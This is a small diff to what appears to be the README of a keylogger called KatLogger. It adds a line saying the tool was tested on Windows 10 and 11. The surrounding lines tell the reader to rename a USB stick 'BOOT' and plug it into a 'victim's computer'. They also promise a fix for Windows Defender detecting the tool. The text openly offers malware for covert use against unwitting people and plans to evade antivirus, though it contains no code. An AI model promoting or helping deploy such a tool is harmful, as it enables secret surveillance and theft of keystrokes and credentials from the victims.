@@ -34,6 +34,7 @@ The installation it's very simple; follow these steps:
 - Rename the usb stick to "BOOT"
 - That's all
 - Plug the usb in your victim's computer and enjoy =]
+(Tested on Windows 10 and Windows 11)
 <br>
 
 ### Unfortunatly with the latest updates Windows Defender detects KatLogger, we're going to fix this issue soon. Thank you for your undestanding
